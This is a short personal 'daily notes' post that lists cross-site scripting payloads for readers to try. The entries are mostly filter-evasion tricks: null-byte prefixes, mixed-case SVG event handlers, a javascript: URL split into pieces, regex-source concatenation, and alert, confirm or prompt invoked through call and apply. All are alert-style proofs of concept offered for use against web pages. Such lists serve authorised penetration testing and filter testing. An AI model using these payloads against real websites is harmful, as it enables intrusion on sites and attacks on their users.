Daily Notes : Day 42 
XSS Payload you should try !!

<script>/&/-alert(1)</script>
<script>/&/-alert(1)</script>

%00%00%00%00%00%00%00<script>alert(1)</script>     (1.Null bytes are output   2.There is no space character immediately before)

<sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`">

<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click 

<script>http://alert.call(null,1)</script>   (http://alert.call(%20, "XSS");)

<script>http://confirm.call(null,1)</script>

<script>http://prompt.call(null,1)</script>

<script>alert.apply(null, [1])</script>